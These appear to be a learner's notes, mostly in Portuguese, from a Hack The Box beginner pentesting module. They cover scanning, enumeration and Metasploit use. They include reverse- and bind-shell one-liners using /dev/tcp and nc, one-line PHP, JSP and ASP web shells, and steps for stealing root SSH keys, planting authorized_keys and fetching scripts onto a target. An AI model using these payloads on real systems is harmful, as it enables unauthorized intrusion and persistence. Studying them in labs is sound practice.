# Getting Started - Module.

## Setup

### Connecting Using VPN
1. Vpn é útil para que você mantenha seu anonimato, quando estiver pegando informações do alvo.
dando um degral a mais de dificuldade, caso você esteja em um blackbox e o indivíduos da TI não 
estejam cientes do seu ataque.
2. ISP -> Internet service provider (Provedor de internet), VPN existe para tentar camuflar isso.
3. Client-based VPN e SSL VPN. SSL VPN usa a web browser como client VPN. Enquanto que o Client-based VPN 
é utilizado para quando é necessário muitos empregados acessem a intranet da companhia, então utiliziam 
um VPN para cada computador, para que o mesmo tenha acesso aos recursos disponibilizados.
4. Nós podemos utilizar o NordVPN ou Private Internet Access e se conectar nessas VPN's que estão localizadas em outros paises.
para evitar que nosso endereço IP esteja disponível para qualquer pessoa. Mas isso não garante que os servidores não estejam 
guardando os seus dados e muito menos que eles irão te proteger caso você esteja utilizando VPN para realizar atividades
criminais. Geralmente VPN's são úteis para quando você quiser acessar alguma parte da internet protegida por região ou
para acessar redes perigosas, como wifi públicos e tudo mais.
5. Nunca use os VPN's disponibilizados pela HTB para ataques a alvos, desabilite todas as portas e entradas a seu computador, sempre busque realizar os testes utilizando uma máquina virtual e caso utilize um SSH, desabilite o password authentication.
6. Para acessar o vpn da HTB, utilize o seguinte comando:
```zsh
sudo openvpn user.ovpn
```
7. ifconfig -> Mostra as configurações da internet no seu computador, ao conectar o vpn fica uma interface tun que informa que 
existe uma conexão com o VPN e tudo mais, como cancela a conexão com o VPN ??? KKKK - Para sair do openvpn basta usar o seguinte comando:
```zsh
sudo killall openvpn
```
8. utilizando o comando **netstat -rn** ele mostra como está a situação das net na sua máquina

## Pentesting Basics

### Common Terms
1. shell -> Famoso terminal que podemos executar comandos e tudo mais, dá para fazer muita coisa com eles, para não dizer tudo.
2. Existem 3 tipos de shell principais: Reverse shell (Initiates a connection back to a "listener" on our attack box.)
Bind shell ("Binds" to a specific port on the target host and waits for a connection from our attack box)
Web shell (Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be user to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command))
3. Cada tipo de shell tem seu caso de uso. E geralmente são utilizados scripts em linguagens de programação para acessar esses shels.
4. Port -> São as portas de um computador, são por elas que um computador pode acessar outro, caso tal pc tenha alguma porta com 
alguma vunerabilidade, essa pode ser a porta de entrada para seu ataque.
5. Geralmente a numeração das portas seguem um padrão, por exemplo a porta 80 é a do protocolo HTTP, ja a 443 é a do HTTPS, por padrão, mas esses protocolos podem estar em diferentes portas, dependendo da configuração do pc.
6. Existe duas categorias de portas, as TCP (Transmission Control Protocol) e a UDP (User Datagram Protocol)
7. TCP é uma conexão estável, onde primeiro é feito a conexão e depois é feito a troca de dados.
8. UDP é uma conexão caótica, onde é enviado os dados e nem sempre todos os dados são enviados corretamente, geralmente é utilizado para envio de dados online e comunicação ao vivo.
9. Existem 65.535 TCP portas e 65.535 UDP portas.
10. Lista de portas conhecidas e seus serviços:
```csv
Port, Protocol
20/21(TCP), FTP
22(TCP), SSH
23(TCP), Telnet
25(TCP), SMTP
80(TCP), HTTP
161(TCP/UDP), SNMP
389(TCP/UDP), LDAP
443(TCP), SSL/TLS(HTTPS)
445(TCP), SMB
3389(TCP), RDP
```
11. Links úteis:
```txt
https://owasp.org/www-project-top-ten/ -> Lista das 10 vulnerabilidades mais perigosas para web
https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html -> Portas comuns encontradas pelo nmap
```

### Basic Tools
> SSH - Secure Shell
  Protocolo de internet que roda na porta 22 por padrão.
  Ele é bem mais útil que shell reverso, pois geralmente é utilizado por usuários próprios para acessar algum pc de forma remota
  SSH pode ser utilizado com senha ou então com chaves públicas e privadas, onde é modificado de acordo com o endereço ip que 
  foi criado. É possível você utilizar o OpenSSH para acessar pc's remotamente caso se tenha a senha e com isso, as vezes, 
  já conseguir o usuário hoot do sistema, para acessar usando SSH, para utilizar basta fazer o seguinte comando e digitar a senha:
  ```zsh
  ssh Bob@10.10.10.10 
  password: ********
  ```
> Netcat - ncat ou nc
  É uma excelente ferramente de internet para se comunicar utilizando TCP/UDP portas. Pode ser utilizada para conexão com shells
  pode ser utilizada para se conectar com qualquer porta em um pc e interagir com o serviço que está rodando.
  Por exemplo, a gente pode verificar qual serviço está rodando em qual porta utilizando o netcat, caso você queira saber
  qual serviço está rodando na porta 22, basta utilizar o seguinte comando:
  ```zsh
  netcat 10.10.10.10 22
  SSH-2.0-OpenSSH_8.4p1 Debian-3
  ```
  Trazendo para nós que está rodando um serviço de SSH nessa porta. Esse retorno é chamado de Banner Grabbing
  Netcat também pode ser utilizado para transferir arquivos entre pc's
  Existe um primo do Netcat chamado Socat que possue funcionalidades interessantes e úteis, vale a penas estudar depois.
> Tmux - Terminal multiplexers
  Muito útil, pois é possível ter vários terminais rodando na mesma janela e assim aumenta a produtividade.
> Vim - Terminal muito útil
  i -> Para entrar no modo de inserção
  p -> Cola o que está copiado
  x -> Corta o catacter
  dw -> Corta a palavra
  dd -> Corta a linha
  yw -> copia a palavra
  yy -> Copia a linha
  4yw -> Copia 4 quatro palavras em sequência
  Commands:
  :1 -> Vai a linha 1
  :w -> Salva o arquivo
  :q -> Sai do vim
  :q! -> Sai sem salvar
  :wq -> Salva e sai do vim.
  Link útil para estudar o vim:
  https://vimsheet.com/

### Service Scanning
1. Primeira coisa a se fazer é identificar o S.O do pc e quais serviços estão sendo executados nesse ip.
2. IP é um identificador único de um computador e as portas são os serviços que tal computador disponibiliza.
3. Para conseguir acessar um computador precisa ter acesso ao seu IP, a porta que está executando algum serviço e a linguagem para se comunicar com tal serviço.
4. Existem tools que automatiza a busca dessas informações, precisando ter apenas o IP da máquina, um desses serviços é o NMAP
> NMAP - Network Mapper
  Quando se executa nmpa [IP] ele percorre as 1000 portas por padrão e retorna a que encontrar, mesmo que esteja aberta ou fechada.
  Ele retorna a Porta/tipo de comunicação, o estado da porta (Se está aberta ou fechada), Service (Serviço que está executando)
  Se o State estiver como filtered, então existe um farewell ali que só permite a entrada por um endereço específico.
  PORT 3389 -> Porta padrão para o Remote Desktop Services e é uma excelente indicação que o alvo é uma máquina windows.
  PORT 22 -> Pode indicar que está rodando uma máquina Linux nesse pc.
  Nós podemos utilizar os parâmetros -sC para tentar receber maiores informações sobre o alvo.
  O parâmetro -sV para tentar pegar as versões do serviço que está sendo executado.
  O parâmetro -p- informa ao nmap que a gente quer scanear todas as 65.535 portas TCP.
  
  Uma forma de encontrar arquivos rapidamente é utilizando o comando locate (Localiza), por exemplo:
  ```zsh
  locate scripts/citrix
  ```
  Para executar scripts no nmap, basta utilizar o seguinte comando:
  ```zsh
  nmap --script <script name> -p<port> <host>
  ```

> Attacking Network Services
  Banner Grabbing -> Quando você acessa um serviço, geralmente ele mostra um banner para informar qual serviço é aquele e tudo mais.
  Para ter esse tipo de informação você pode utilizar o Netcat ou nc, passando o ip e a porta, então você recebe essa info:
  nc -nv 10.129.42.253 21
  Ou então utilizar o nmap para isso:
  nmap -sV --script=banner -p21 10.10.10.0/24

> FTP 
  Geralmente utilizado para fazer troca de arquivos, porém com o nmap é possível identificar se pode acessar o ftp de modo
  anônimo e se tem alguma pasta pública que pode ser acessada.
  Para se conectar usando o ftp, basta utilizar o seguinte comando:
  ftp -p [IP]
  Ao fazer a conexão utilizando o FTP você entra no terminal FTP que pode utilizar alguns comandos:
  ls -> Lista os arquivos
  cd -> Troca de pasta
  get -> Faz o download de arquivo
  exit -> sai do terminal FTP
  
> SMB - Server Message Block
  Ele carrega alguns dados sensíveis, como credenciais e é utilizado para compartilhar isso pela internet, além de ser bem
  vulnerável para alguns exploits.
  É possível enumerar alguns serviços SMB utilizando o nmap:
  nmap --script smb-os-discovery.nse -p445 10.10.10.40
  Para pegar mais informações sobre esse serviço, é possível executar o seguinte comando do nmap
  nmap -A -p445 10.129.42.253
  shares -> SMB as vezes disponibiliza pastas para que usuários possam trocar informações de forma pública e as vezes é possível
  encontrar alguma senha nessas pastas, para poder ter acesso as essas pastas basta utilizar o comando:
  smbclient -N -L \\\\10.129.42.253
  para acessar o SMB utilizando algum usuário, basta utilizar o seguinte comando
  smbclient -U bob \\\\10.129.42.253\\users
  E colocar a senha do usuário.
  
> SNMP - Provedor de comunicação por strings
  Parece que ele consegue trazer informações para nós sobre os serviços que estão sendo executados de forma pública, hmmm
  Segue o código:
  snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
  Ele escaneia as strings de comunidades que o computador está utilizando??

### Web Enumeration

> Gobuste 
  Ao encontrar algum webservice é sempre bom procurar se existem pastas públicas e para isso existe algumas ferramentes úteis
  como ffuf ou GoBuster para enumerar as pastas.

> Directory/File Enumeration
  GoBuster pode ser utilizado para realizar DNS, vhost e utilar Brute-Force para pastas.
  para fazer uma busca nas pastas do WebService basta utilizar o seguinte commando:
  ```zsh
  gobuster dir -u http://[ip]/ -w /usr/share/dirb/wordlists/common.txt
  ```
  Status code 200 -> Revela que a requisição deu bom
  Status code 403 -> Não tem acesso ao recurso
  Status code 301 -> Que foi redirecionado

> DNS Subdomain Enumeration
  Pode utilizar o gobuster no modo dns e fazer a varredura, faz o clone do repositório seclists e instala ele
  depois adiciona o servidor DNS como 1.1.1.1 em /etc/resolv.conf
  depois executa o seguinte código:
  ```zsh
  gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
  ```
  
> Web Enumeration Tips
  Web Server Headers consegue passar para você algumas informações bem úteis sobre o que está hospedado naquele endereço 
  Para isso você pode utilizar o curl, onde é possível pegar algumas informações de um link, utilize o seguinte código:
  ```zsh
  curl -IL https://www.inlanefreight.com
  ```
  Uma outra ferramenta útil é o EyeWitness, que pode tirar print do alvo, escanear ele e identificar possíveis credenciais padrões.
  * Whatweb: Nós podemos extrair algumas versões de servidores web, frameworks utilizados e aplicações utilizando esse tool:
  ```zsh
  whatweb 10.10.10.121
  ```
  É possível fazer enumeração até subip's utilizando o whatweb:
  ```
  whatweb 10.10.10.0/24
  ```

  * Certificates: SSL/TLS é possível pegar alguns emails, nome de empresa para um possível pishing.

  * Robots.txt: Utilizado para que os indexadores de buscadores ou web crawlers não tenha acesso a alguns links privatos e tudo
  mais, mas é acessível para humanos, então ao entrar em um é possível verificar quais links não estão sendo indexados
  pelo google, por exemplo.

  * Source Code: As vezes no código fonte há muita informação interessante em comentários, então é sempre bom estar ciente disso

### Public Exploits

> Finding Public Exploits
  Google é uma ótima ferramenta para encontrar exploits publicos de algum serviço.
  Uma outra ótima ferramenta é o searchsploit, onde é possível instalar utilizando sudo apt install exploitdb -y 
  e utilizar usando o seguinte comando:
  searchsploit openssh 7.2

> Metasploit Primer
  Muito útil para diversas atividades na área de pentesters, para começar a utilizar basta digitar msfconsole e você entrar
  no console do metasploit.
  Depois utilizar o comando search exploit [nome do serviço] ai ele retorna os exploits disponíveis para aquele serviço.
  Depois que encontrar o exploit, basta utilizar ele com o comando use [caminho do exploit.]
  Antes de executar o exploit é necessário realizar algumas configurações, para ter acesso as essas configurações basta utilizar o comando show options
  coloque todas as opções obrigatórias como yes, depois set o RHOSTS com os ip's do alvo.
  Pode ser 1 IP, vários IP's ou um arquivo com uma lista de IP's
  para setar os valores, bata digitar set [variable] [value]
  ```zsh
  set RHOSTS 10.10.10.40
  set LHOSTS tun0 -> VPN aqui
  ```
  Com isso, podemos executar o exploit, mas antes podemos checkar a vulnerabilidade do algo utilizando o comando check.
  Depois que tiver a ctz que o alvo é vulnerável, então basta executar o comando run ou exploit, assim o exploit será injetado
  no alvo.
  Depois que injeta, é possível utilizar o comando getuid para informar que usuário ganhou acesso ou shell, para acessar o 
  shell da máquina diretamente.
 
### Types of Shells
  Para se comunicar com o sistema alvo, é necessário realizar através de comandos utilizando um shell
  então é necessário tentar conseguir algum shell, como Reverse Shell, Bind Shell, Web Shell.
  Reverse Shell -> Conecta de volta nosso sistame dá a nós o controle através de conexão reversa.
  Bind Shell -> Espera para que alguém tente conectar no shell
  Web Shell -> Se comunica através de web server, aceita comandos utilizando parametros HTTP, executa eles e mostra o resultado.
  1. Reverse Shell:
   É um dos mais simples e utilizados, nós podemos utilizar o netcat para abrir uma porta na nossa máquina e ficar esperando
   alguma conexão, então quando a gente conseguir invadir a máquina alvo, enviamos um comando para um requisição para o nosso
   ip para a porta que escolhemos e então o netcat gera um shell reverso. 
   (Netcat Listener)
   > Comece um netcat escutando a porta que você quer
   $ nc -lvnp 1234
   > -l para Listen Mode; -v Verbose Mode; -n Desabilita a conexão via DNS, conecta somente por IP; -p Port Number;
   (Connect Back IP):
   > Encontre o seu IP.
   $ ip a
   (Reverse Shell Command):
   > Na máquina alvo a gente executa o seguinte comando:
   $ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
   $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
   O Reverse Shell pode ser bem frágil, caso nós percamos a conexão com o alvo, é necessário realizar o exploit novamente 
   e executar o Reverse Shell novamente.
  2. Bind Shell
   Em vez de a gente utilizar a máquina alvo para se conectar a nós, utilizamos o nosso pc para se conectar a uma porta
   na máquina alvo e conseguir o Shell.
   Ai basta se conectar a ess porta com o netcat e pronto, temos acesso ao shell.
   (Bind Shell Command):
   Para fazer que o host crie um bind shell, pode utilizar o bash:
   $ rm /tmp/f;mkfifo /tmp/f/;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
   (Netcat Connection):
   Agora só conectar no host
   $ nc 10.10.10.1 1234
   (Upgrading TTY):
   Quando a gente consegue acesso ao shell, não podemos utilizar algumas features como historico de comando e edição de comando
   para isso a gente dar um upgrade no shell, podemos utilizar o python para isso.
   $ python -c 'import pty; pty.spawn("/bin/bash")'
   * ctrl+z para executar o comando em background.
   $ stty raw -echo
   $ fg
   $ echo $TERM
   $ stty size
   # export TERM=xterm-256color
   # stty rows 67 columns 318
  3. Web Shell
   Geralmente é um web script em PHP ou ASPX, que aceita requisições GET ou POST. executa nosso comando e printa na tela ou na página web.
   (Writing a Web Shell):
   Geralmente o script é pequeno e podemos memoriza-los:
   > PHP:
   <?php system($_REQUEST["cmd"]); ?>
   > jsp
   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
   > asp
   <% eval request("cmd") %>
   (Uploading a Web Shell):
   Depois que criar o web shell, é necessário fazer o upload desse arquivo no banco de dados e executar ele para que possamos ter acesso.
   _Depois que colocar o arquivo na pasta padrão de execução do servidor, podemos utilizar a url do navegador para 
   enviar comandos de dentro do terminal e ele retorna para nós os dados.
   É um tipo de shell muito bom, pois não precisamos ter que abrir uma porta no alvo pois o serviço já está executando,
   caso o servidor seja reinicializado, o arquivo ainda estará lá, então é só acessar novamente e pronto.

### Privilege Escalation
  Geralmente quando a gente consegue um shell, ele não tem tantos privilégios como um root, então a gente precisa explorar internamente
  para conseguir alguma brecha e conseguir o usuário root.
  1. PrivEsc Checklists
   Tem alguns sites que oferecem forma de verificar se temos acesso a algumas funcionalidades para podermos tentar conseguir um acesso maior.
  2. Enumeration Scripts
   Existe alguns scripts que enumeram o que determinados usuários podem acessar.
  3. Kernel Exploits
   É possível ter acesso diretamente a um shell como root, quando o Kernel ou o S.O é antigo, pois assim conseguimos explorar o S.O, mas deve-se ter cuidado ao fazer isso
   pois o computador pode ficar instável ao tentar explorar o Kernel.
  4. Vulnerable SOftware
   Podemos verificar os arquivos que estão instalados no pc e procurar exploits para tais para tentar conseguir escalar os privilégios através disso.
  5. User Privileges
   As vezes os usuários que a gente consegue o shell pode executar alguns comandos ao utilizar o sudo, para verificar quais comandos a gente pode executar basta digitar
   $ sudo -l
   Se o resultado for ALL, então podemos trocar de usuário para o root facilmente.
   $ sudo su -
  6. Scheduled Tasks
   Se nós tivermos acesso a escrever schedule tasks, então podemos escrever um script bash para nos dar um shell reverso.
  7. Exposed Credentials
   Podemos encontrar senhas em arquivos de configurações, logs, históricos de bash e com isso ter acesso a senha de outros usuários e tentar realizar mais uma escalação de privilégios.
  8. SSH Keys
   Se nós pudermos ler os arquivos da pasta /root/.ssh/, então podemos copiar o arquivo id_rsa, executar uma conexão ssh passando como chave o id_rsa que temos em nossa máquina, então
   conseguimos um acesso diretamente ao shell como root.
   Outra forma seria criar uma chhave ssh nova, copiar a chave pública e colocar no root da máquina alvo, na parte de authorized_keys e depois só realizar uma chamada ssh, assim 
   conseguimos um shell lindo.

### Transferring Files
  Geralmente é necessário carregar scripts para a máquina alvo, quando se utiliza 
  o metasploit, é possível enviar alguns arquivos com upload, mas 
  1. Using wget
    Existe algumas formas de realizar isso, a primeira seria utilizando o python, primeiro você vai para a pasta onde está o arquivo que você quer e execute o seguinte comando:
    $ python3 -m http.server 8000
    > Desta forma, quando você estiver no host, basta dar wget e pegar o arquivo.
    ! wget http://10.10.14.1:8000/linenum.sh
    Caso o host não possua o wget, então basta utilizar o cUrl
    $ curl http://10.10.14.1:8000/linenum.sh -o lineenum.sh
  2. Using SCP
    Se tiver conseguido acesso utilizando um ssh, então é possível transferir
    arquivos com o SCP:
    > scp linenum.sh user@remotehost:/tmp/linenum.sh
  3. Using Base64
    Se não for possível fazer downloads no host e nem tiver sido alguma conexão via 
    ssh ou algo do tipo, ainda é possível passar um arquivo para o host, utilizando
    o base64, para isso, você tem que pegar o arquivo binário que você quer passar
    e passa-lo no seguinte código:
    > base64 shell -w 0
    o retorno você copia e cola num arquivo na máquina host, dando um:
    > echo [binário ] | base64 -d > shell
  4. Validating File Transfers
    Para validar o formato de um arquivo, podemos utilizar o comando file
    > file shell
    Para verificar ainda se foi o arquivo exatamente como está, podemos utilizar o md5
    assim verificamos como está o hash dos dois arquivos e se são iguais:
    > md5sum shell
    